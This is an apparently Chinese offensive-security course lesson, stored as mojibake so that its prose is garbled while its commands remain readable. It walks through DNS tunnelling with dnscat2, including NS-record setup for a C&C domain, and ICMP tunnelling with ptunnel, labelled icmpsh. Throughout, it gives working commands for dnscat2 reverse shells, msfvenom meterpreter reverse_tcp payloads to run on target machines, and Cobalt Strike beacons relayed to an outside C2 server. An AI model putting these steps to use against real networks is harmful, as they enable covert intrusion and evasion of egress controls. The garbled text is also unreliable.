# ç½‘ç»œå®‰å…¨å°±ä¸šæ¨è P67ï¼šç¬¬36å¤©ï¼šDnscat2ã€icmpshæ­å»ºéš§é“ ğŸ› ï¸

![](img/3357aabe3ef035b1ca65210de75e7e67_0.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_1.png)

## æ¦‚è¿°

![](img/3357aabe3ef035b1ca65210de75e7e67_3.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_5.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_7.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_9.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ ä¸¤ç§é‡è¦çš„éš§é“æŠ€æœ¯ï¼š**Dnscat2** å’Œ **icmpsh**ã€‚æˆ‘ä»¬å°†åˆ†åˆ«ä»‹ç»å®ƒä»¬çš„ä¸¤ç§å·¥ä½œæ¨¡å¼ï¼ˆç›´è¿å’Œä¸­ç»§ï¼‰ï¼Œå¹¶é€šè¿‡å®é™…æ“ä½œæ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¿™äº›éš§é“å»ºç«‹å‘½ä»¤æ§åˆ¶é€šé“ï¼Œä»¥åº”å¯¹ç›®æ ‡ç½‘ç»œç¯å¢ƒå¯¹ç‰¹å®šåè®®ï¼ˆå¦‚TCP/UDPï¼‰çš„é™åˆ¶ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_11.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_13.png)

---

![](img/3357aabe3ef035b1ca65210de75e7e67_15.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_17.png)

## Dnscat2 éš§é“æŠ€æœ¯

![](img/3357aabe3ef035b1ca65210de75e7e67_19.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_21.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_22.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_24.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_25.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†è¯¾ç¨‹æ¦‚è¿°ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹ **Dnscat2** çš„å…·ä½“ä½¿ç”¨ã€‚Dnscat2 æ˜¯ä¸€æ¬¾åˆ©ç”¨ DNS åè®®è¿›è¡ŒåŠ å¯†é€šä¿¡çš„éš§é“å·¥å…·ï¼Œå¸¸ç”¨äºåœ¨åªå…è®¸ DNS æµé‡å¤–å‡ºçš„ç¯å¢ƒä¸­å»ºç«‹å‘½ä»¤æ§åˆ¶ã€‚

### ç›´è¿æ¨¡å¼

![](img/3357aabe3ef035b1ca65210de75e7e67_27.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_29.png)

ç›´è¿æ¨¡å¼è¦æ±‚å®¢æˆ·ç«¯èƒ½ç›´æ¥è®¿é—®æœåŠ¡ç«¯çš„ IP åœ°å€å’Œ 53 ç«¯å£ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_31.png)

ä»¥ä¸‹æ˜¯å¯åŠ¨æœåŠ¡ç«¯çš„æ­¥éª¤ï¼š

1.  è¿›å…¥å·¥å…·ç›®å½•å¹¶æ‰§è¡Œå¯åŠ¨è„šæœ¬ã€‚
    ```bash
    cd /path/to/dnscat2/server/
    ruby ./dnscat2.rb
    ```
2.  æ‰§è¡Œåï¼ŒæœåŠ¡ç«¯ä¼šç›‘å¬æœ¬åœ°çš„ UDP 53 ç«¯å£ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªå¯†é’¥ï¼ˆ`secret`ï¼‰ã€‚å®¢æˆ·ç«¯è¿æ¥æ—¶éœ€è¦æ­¤å¯†é’¥ã€‚
3.  å¦‚æœé‡åˆ° 53 ç«¯å£è¢«å ç”¨ï¼ˆä¾‹å¦‚è¢« `systemd-resolved` æœåŠ¡å ç”¨ï¼‰ï¼Œéœ€è¦ä¿®æ”¹ç›¸å…³é…ç½®æ–‡ä»¶ä»¥é‡Šæ”¾è¯¥ç«¯å£ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_33.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_34.png)

æœåŠ¡ç«¯å¯åŠ¨åï¼Œéœ€è¦åœ¨ç›®æ ‡æœºå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šæ‰§è¡Œç¼–è¯‘å¥½çš„å®¢æˆ·ç«¯ç¨‹åºã€‚

ä»¥ä¸‹æ˜¯å¯åŠ¨å®¢æˆ·ç«¯çš„å‘½ä»¤ç¤ºä¾‹ï¼š
```bash
./dnscat2 --dns server=<SERVER_IP>,port=53 --secret=<SERVER_SECRET>
```
å…¶ä¸­ `<SERVER_IP>` æ˜¯æœåŠ¡ç«¯ IPï¼Œ`<SERVER_SECRET>` æ˜¯æœåŠ¡ç«¯ç”Ÿæˆçš„å¯†é’¥å­—ç¬¦ä¸²ã€‚

è¿æ¥æˆåŠŸåï¼ŒæœåŠ¡ç«¯ä¼šæ˜¾ç¤º `Session established`ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªçª—å£ï¼ˆ`window`ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘½ä»¤ä¸å®¢æˆ·ç«¯è¿›è¡Œäº¤äº’ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_36.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_38.png)

ä»¥ä¸‹æ˜¯å¸¸ç”¨çš„ç®¡ç†å‘½ä»¤åˆ—è¡¨ï¼š
*   `windows` æˆ– `window`ï¼šæŸ¥çœ‹å½“å‰æ‰€æœ‰ä¼šè¯çª—å£ã€‚
*   `session -i <id>`ï¼šè¿›å…¥æŒ‡å®š ID çš„ä¼šè¯çª—å£ã€‚
*   åœ¨ä¼šè¯çª—å£ä¸­ï¼Œå¯ä»¥æ‰§è¡Œ `shell` å‘½ä»¤æ¥è·å–ä¸€ä¸ªåå‘ shellï¼Œè¿›è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚ `ls`, `whoami`ï¼‰ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_40.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_42.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_44.png)

### ä¸­ç»§æ¨¡å¼

![](img/3357aabe3ef035b1ca65210de75e7e67_46.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_48.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†ç›´è¿æ¨¡å¼ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹ä¸­ç»§æ¨¡å¼ã€‚ä¸­ç»§æ¨¡å¼é€šè¿‡å…¬ç½‘åŸŸåè¿›è¡Œé€šä¿¡ï¼Œæ›´é€‚åˆå®¢æˆ·ç«¯æ— æ³•ç›´æ¥è¿æ¥æœåŠ¡ç«¯ IP çš„åœºæ™¯ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_50.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_52.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_54.png)

ä½¿ç”¨ä¸­ç»§æ¨¡å¼éœ€è¦åšä»¥ä¸‹å‡†å¤‡ï¼š
1.  ä¸€å°å…¬ç½‘æœåŠ¡å™¨ï¼ˆä½œä¸ºC&CæœåŠ¡å™¨ï¼‰ã€‚
2.  ä¸€å°é¶æœºï¼ˆå†…ç½‘æˆ–å…¬ç½‘å‡å¯ï¼‰ã€‚
3.  ä¸€ä¸ªå¯è‡ªä¸»é…ç½® DNS è§£æçš„åŸŸåã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_56.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_58.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_60.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_62.png)

é…ç½®åŸŸåçš„æ ¸å¿ƒæ˜¯è®¾ç½® NS è®°å½•ï¼Œå°†ç‰¹å®šå­åŸŸåçš„è§£ææƒæŒ‡å‘æˆ‘ä»¬çš„ C&C æœåŠ¡å™¨ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_64.png)

ä»¥ä¸‹æ˜¯å…·ä½“çš„ DNS è§£æé…ç½®æ­¥éª¤ï¼š
1.  æ·»åŠ ä¸€æ¡ A è®°å½•ï¼Œå°†è‡ªå®šä¹‰çš„ NS æœåŠ¡å™¨åç§°ï¼ˆå¦‚ `ns.xxx.com`ï¼‰è§£æåˆ° C&C æœåŠ¡å™¨çš„å…¬ç½‘ IPã€‚
2.  æ·»åŠ ä¸€æ¡ NS è®°å½•ï¼Œå°†ç”¨äºéš§é“çš„å­åŸŸåï¼ˆå¦‚ `tunnel.xxx.com`ï¼‰çš„æƒå¨ DNS æœåŠ¡å™¨æŒ‡å‘ä¸Šä¸€æ­¥è®¾ç½®çš„ NS æœåŠ¡å™¨åç§°ï¼ˆ`ns.xxx.com`ï¼‰ã€‚

é…ç½®å®Œæˆåï¼Œå¯åŠ¨æœåŠ¡ç«¯æ—¶éœ€è¦æŒ‡å®šåŸŸåã€‚

æœåŠ¡ç«¯å¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼š
```bash
ruby ./dnscat2.rb tunnel.xxx.com --secret=MySecret
```
å®¢æˆ·ç«¯å¯åŠ¨æ—¶ï¼Œåˆ™ä½¿ç”¨è¯¥åŸŸåè¿›è¡Œè¿æ¥ã€‚

å®¢æˆ·ç«¯å¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼š
```bash
./dnscat2 --dns domain=tunnel.xxx.com --secret=MySecret
```
å…¶å·¥ä½œåŸç†æ˜¯ï¼šå®¢æˆ·ç«¯è§£æ `tunnel.xxx.com` æ—¶ï¼Œæ ¹æ® NS è®°å½•æ‰¾åˆ°æˆ‘ä»¬çš„ C&C æœåŠ¡å™¨è¿›è¡Œè§£æï¼Œä»è€Œå°† DNS æŸ¥è¯¢æµé‡å¯¼å‘æˆ‘ä»¬çš„æœåŠ¡ç«¯ï¼Œå»ºç«‹éš§é“ã€‚

è¿æ¥å»ºç«‹åçš„ç®¡ç†ä¸ç›´è¿æ¨¡å¼ç›¸åŒï¼Œå¯ä»¥é€šè¿‡ `session` ç­‰å‘½ä»¤è¿›è¡Œæ§åˆ¶ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_66.png)

---

![](img/3357aabe3ef035b1ca65210de75e7e67_68.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_70.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_72.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_74.png)

## icmpsh éš§é“æŠ€æœ¯

![](img/3357aabe3ef035b1ca65210de75e7e67_76.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_78.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_80.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬å®Œæˆäº† Dnscat2 çš„å­¦ä¹ ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹ **icmpsh** éš§é“ã€‚å½“ç›®æ ‡ç¯å¢ƒä¸¥æ ¼åˆ°åªå…è®¸ ICMP åè®®ï¼ˆå¦‚ pingï¼‰å‡ºç½‘æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ ICMP éš§é“å·¥å…·è¿›è¡Œç©¿é€ï¼Œè¿™é‡Œæˆ‘ä»¬ä»‹ç» **ptunnel** å·¥å…·ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_82.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_84.png)

### è½¬å‘ TCP æµé‡ä¸Šçº¿ MSF

![](img/3357aabe3ef035b1ca65210de75e7e67_86.png)

æ­¤æ–¹æ³•å°† TCP æµé‡å°è£…åœ¨ ICMP éš§é“ä¸­ï¼Œä½¿ MSF çš„ TCP payload èƒ½åœ¨ä»…å…è®¸ ICMP çš„ç¯å¢ƒä¸‹ä¸Šçº¿ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_88.png)

é¦–å…ˆï¼Œåœ¨å…¬ç½‘ VPS ä¸Šå¯åŠ¨ ptunnel æœåŠ¡ç«¯ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_90.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_92.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_94.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_96.png)

æœåŠ¡ç«¯å¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼š
```bash
./ptunnel -x MyPassword
```
`-x` å‚æ•°æŒ‡å®šè¿æ¥å¯†ç ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_98.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_100.png)

æ¥ç€ï¼Œåœ¨é¶æœºï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šå¯åŠ¨ ptunnel å®¢æˆ·ç«¯ï¼Œå¹¶é…ç½®ç«¯å£è½¬å‘ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_102.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_104.png)

å®¢æˆ·ç«¯å¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼š
```bash
./ptunnel -p <SERVER_IP> -lp 9999 -da <MSF_SERVER_IP> -dp 7777 -x MyPassword
```
*   `-p`: æœåŠ¡ç«¯ IPã€‚
*   `-lp 9999`: åœ¨å®¢æˆ·ç«¯æœ¬åœ°ç›‘å¬ 9999 ç«¯å£ã€‚
*   `-da` å’Œ `-dp`: æŒ‡å®šæœ€ç»ˆè¦è½¬å‘åˆ°çš„ç›®æ ‡åœ°å€å’Œç«¯å£ï¼ˆå³ MSF ç›‘å¬åœ°å€ï¼‰ã€‚
*   `-x`: ä¸æœåŠ¡ç«¯ä¸€è‡´çš„å¯†ç ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_106.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_108.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_110.png)

ç„¶åï¼Œä½¿ç”¨ MSF ç”Ÿæˆä¸€ä¸ª payloadï¼Œå…¶åå‘è¿æ¥åœ°å€è®¾ç½®ä¸ºé¶æœºæœ¬åœ°çš„ 9999 ç«¯å£ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_112.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_114.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_116.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_118.png)

ç”Ÿæˆ Payload çš„å‘½ä»¤å¦‚ä¸‹ï¼š
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<é¶æœºæœ¬åœ°IP> LPORT=9999 -f exe -o shell.exe
```
å°†ç”Ÿæˆçš„ `shell.exe` åœ¨é¶æœºä¸Šæ‰§è¡Œã€‚è¯¥ç¨‹åºä¼šå‘ `127.0.0.1:9999` å‘èµ· TCP è¿æ¥ï¼Œè¯¥è¿æ¥è¢« ptunnel å®¢æˆ·ç«¯æ•è·ï¼Œé€šè¿‡ ICMP éš§é“è½¬å‘è‡³æœåŠ¡ç«¯ï¼Œå†ç”±æœåŠ¡ç«¯è§£å¯†å¹¶è½¬å‘åˆ° MSF ç›‘å¬çš„ `7777` ç«¯å£ï¼Œä»è€ŒæˆåŠŸä¸Šçº¿ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_120.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_122.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_124.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_125.png)

### è½¬å‘ Socks5 ä»£ç†æµé‡ä¸Šçº¿ MSF

![](img/3357aabe3ef035b1ca65210de75e7e67_127.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_128.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_130.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_132.png)

æ­¤æ–¹æ³•åœ¨é¶æœºä¸Šå»ºç«‹ä¸€ä¸ª Socks5 ä»£ç†ï¼Œå¹¶å°†ä»£ç†æµé‡é€šè¿‡ ICMP éš§é“è½¬å‘å‡ºå»ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_134.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_136.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_137.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_139.png)

å¯åŠ¨æœåŠ¡ç«¯çš„æ–¹å¼ä¸å˜ã€‚å¯åŠ¨å®¢æˆ·ç«¯æ—¶ï¼Œéœ€å¯ç”¨ Socks5 è½¬å‘ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_141.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_143.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_145.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_147.png)

å®¢æˆ·ç«¯å¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼š
```bash
./ptunnel -p <SERVER_IP> -lp 9999 -da <MSF_SERVER_IP> -dp 8888 -x MyPassword -socks5
```
`-socks5` å‚æ•°è¡¨ç¤ºåœ¨å®¢æˆ·ç«¯æœ¬åœ° `9999` ç«¯å£å¼€å¯ä¸€ä¸ª Socks5 ä»£ç†æœåŠ¡ã€‚

æ¥ç€ï¼Œä½¿ç”¨ MSF ç”Ÿæˆ payload æ—¶ï¼Œéœ€è®¾ç½®ä»£ç†é€‰é¡¹ï¼Œä½¿å…¶é€šè¿‡é¶æœºæœ¬åœ°çš„ Socks5 ä»£ç†è¿æ¥å‡ºæ¥ã€‚

ç”Ÿæˆ Payload çš„å‘½ä»¤å¦‚ä¸‹ï¼š
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<MSF_SERVER_IP> LPORT=8888 HttpProxyType=SOCKS5 HttpProxyHost=<é¶æœºæœ¬åœ°IP> HttpProxyPort=9999 -f exe -o socks_shell.exe
```
æ‰§è¡Œæ­¤ payload åï¼Œå…¶æµé‡ä¼šå…ˆè¿›å…¥æœ¬åœ° Socks5 ä»£ç†ï¼ˆ`9999`ç«¯å£ï¼‰ï¼Œç„¶åè¢« ptunnel é€šè¿‡ ICMP éš§é“è½¬å‘è‡³æœåŠ¡ç«¯ï¼Œæœ€ç»ˆåˆ°è¾¾ MSF ç›‘å¬çš„ `8888` ç«¯å£ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_149.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_151.png)

### è½¬å‘ TCP æµé‡ä¸Šçº¿ Cobalt Strike

![](img/3357aabe3ef035b1ca65210de75e7e67_153.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_155.png)

åŸç†ä¸ä¸Šçº¿ MSF ç±»ä¼¼ã€‚é¦–å…ˆé…ç½® ptunnel å®¢æˆ·ç«¯è¿›è¡Œç«¯å£è½¬å‘ï¼ˆä¾‹å¦‚å°†æœ¬åœ° `8899` ç«¯å£è½¬å‘åˆ° CS å›¢é˜ŸæœåŠ¡å™¨çš„ `7777` ç«¯å£ï¼‰ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_157.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_159.png)

åœ¨ Cobalt Strike ä¸Šåˆ›å»ºç›‘å¬å™¨æ—¶ï¼Œ`Host` è®¾ç½®ä¸º `127.0.0.1`ï¼Œ`Port` è®¾ç½®ä¸º ptunnel å®¢æˆ·ç«¯ç›‘å¬çš„ç«¯å£ï¼ˆå¦‚ `8899`ï¼‰ã€‚`Beacon` çš„ç«¯å£åˆ™è®¾ç½®ä¸ºå›¢é˜ŸæœåŠ¡å™¨å®é™…ç›‘å¬çš„ç«¯å£ï¼ˆå¦‚ `7777`ï¼‰ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_161.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_163.png)

ç”Ÿæˆ Beacon æ—¶ï¼Œå…¶å›è¿åœ°å€è®¾ç½®ä¸ºé¶æœºæœ¬åœ° IP å’Œ ptunnel å®¢æˆ·ç«¯ç›‘å¬ç«¯å£ï¼ˆ`8899`ï¼‰ã€‚æ‰§è¡Œåï¼Œæµé‡å³å¯é€šè¿‡ ICMP éš§é“ä¸­ç»§è‡³ CS å›¢é˜ŸæœåŠ¡å™¨ã€‚

---

## æ€»ç»“

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†ä¸¤ç§å…³é”®çš„éš§é“æŠ€æœ¯ã€‚
*   **Dnscat2** åˆ©ç”¨ DNS æŸ¥è¯¢å’Œå“åº”å»ºç«‹åŠ å¯†éš§é“ï¼Œé€‚ç”¨äºå…è®¸ DNS æµé‡çš„ç¯å¢ƒï¼Œå¹¶æŒæ¡äº†å…¶ç›´è¿ä¸ä¸­ç»§ä¸¤ç§æ¨¡å¼ã€‚
*   **ptunnel** åˆ©ç”¨ ICMP åè®®å°è£… TCP æˆ– Socks5 æµé‡ï¼Œé€‚ç”¨äºä¸¥æ ¼é™åˆ¶ä¸‹ä»…å…è®¸ ICMP åè®®å‡ºç½‘çš„åœºæ™¯ï¼Œå¹¶å®è·µäº†é€šè¿‡å®ƒä¸Šçº¿ MSF å’Œ CS çš„æ–¹æ³•ã€‚

![](img/3357aabe3ef035b1ca65210de75e7e67_165.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_166.png)

è¿™äº›æŠ€æœ¯æœ‰åŠ©äºæˆ‘ä»¬åœ¨å¤æ‚çš„ç½‘ç»œé™åˆ¶æ¡ä»¶ä¸‹ï¼Œå»ºç«‹ç¨³å®šçš„å‘½ä»¤æ§åˆ¶é€šé“ã€‚